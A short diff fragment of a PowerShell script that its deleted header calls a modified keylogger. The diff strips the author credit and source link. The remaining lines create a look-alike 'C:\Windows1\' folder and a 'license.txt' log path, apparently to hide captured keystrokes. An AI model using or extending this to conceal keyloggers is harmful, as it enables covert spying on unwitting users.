@@ -1,6 +1,3 @@
-# Creator: Securethelogs | @Securethelogs
-# Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
-
 mkdir C:\Windows1\
 
 $path = "C:\Windows1\license.txt"
